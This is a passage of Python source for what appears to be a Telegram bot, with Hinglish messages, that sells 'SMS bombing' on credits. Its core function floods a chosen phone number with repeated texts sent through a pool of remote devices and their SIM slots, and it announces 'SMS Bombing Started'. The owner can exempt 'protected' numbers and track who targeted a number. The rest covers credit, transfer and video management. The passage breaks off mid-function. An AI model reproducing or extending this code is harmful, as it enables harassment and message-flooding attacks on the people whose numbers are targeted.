@R.message(S.admin_send_count, F.text)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        session.blast_data = load()  # Load once at start of blast
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                # Use session-stored data instead of reloading from disk
                                deduct_credits(uid, 1, session.blast_data)
                                session.blast_data["stats"]["total_sent"] = session.blast_data["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in session.blast_data["users"]:
                                    session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                                session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        # FIX: live counters — stop button pe sahi Sent/Failed dikhe
                        session.sent = sent_ok
                        session.failed = sent_fail

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            # FIX: regular users ka "sent" bhi persist hota tha toh missing tha — ab dono save
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await safe_answer(cq, "✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await safe_answer(cq, "🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()

    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return

    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await safe_answer(cq, "🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await safe_answer(cq, "🗑 All Videos Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await safe_answer(cq, "❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await safe_answer(cq, "📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number, F.text)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    log_activity(d, "number_protected", uid, f"Protected {number}")
    save(d)

    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"
        f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>\n\n"
        f"Ab sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})

    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)

    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)

        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")

        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )

    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await safe_answer(cq, "❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await safe_answer(cq, f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await safe_answer(cq, "❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
        f"Jis number ki tracking karni hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Is number se SMS bhejne wale users ka pata chalega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number, F.text)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []

    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break

    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")

    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")

    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount, F.text)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d, is_manual=True)
        count += 1

    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start\n\n"
        f"{em(EMOJI_BELL, '📢')} <i>Credits add kar diye gaye hain.</i>"
    )

    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct / Reset Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne / reset karne hain?\n"
        f"<i>Example: 5 (Ya saare reset karne ke liye jitne marzi ya saare credits katne ke liye amount daalein)</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i><b>Note:</b> Jin users ke credits bot se direct add kiye gaye hain, unke credits safe rahenge aur reset nahi honge!\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount, F.text)
async def owner_deduct_all_credits_confirm(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.update_data(deduct_all_amount=amount)

    confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("✅ YES, DEDUCT", "owner:deduct_all_yes", EMOJI_CHECK, "✅"),
            btn("❌ NO, CANCEL", "owner:home", EMOJI_CROSS, "❌")
        ]
    ])

    await msg.answer(
        f"{em(EMOJI_WARNING, '⚠️')} <b>CONFIRMATION REQUIRED</b>\n\n"
        f"Kya aap sach mein sabhi users se <b>{amount}</b> credits deduct/reset karna chahte hain?\n"
        f"<i>(Direct bot se add kiye gaye credits safe rahenge)</i>",
        reply_markup=confirm_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_yes")
async def owner_deduct_all_yes_handler(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    data = await state.get_data()
    amount = data.get("deduct_all_amount", 0)
    await state.clear()

    users = d.get("users", {})
    if not users:
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])

    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue

        current = udata.get("credits", 0)
        manual_added = udata.get("manual_added_credits", 0)
        
        safe_limit = manual_added
        deductible_pool = max(0, current - safe_limit)
        
        if deductible_pool > 0:
            to_deduct = min(amount, deductible_pool)
            if to_deduct > 0:
                udata["credits"] = current - to_deduct
                count += 1
                total_deducted += to_deduct

    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users with confirmation")
    save(d)

    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted Successfully!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Deducted Amount: <b>{amount}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>\n"
        f"{em(EMOJI_CHECK, '🛡')} Manual/Direct Added Credits: <b>Protected (Safe)</b>\n\n"
        f"<i>{em(EMOJI_WARNING, '⚠️')} Notification nahi bheji gayi.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await safe_answer(cq, "🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await safe_answer(cq, "⛔ Access nahi hai!", show_alert=True)
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await safe_answer(cq, "❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return

    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid, F.text)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return

    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return

    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return

    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)

    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain? (Max {half})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount, F.text)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")

    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2

    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})", parse_mode="HTML")
        return

    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return

    add_credits(target_uid, amount, d, is_manual=False)
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")
    save(d)

    await state.clear()

    try:
        await msg.bot.send_message(
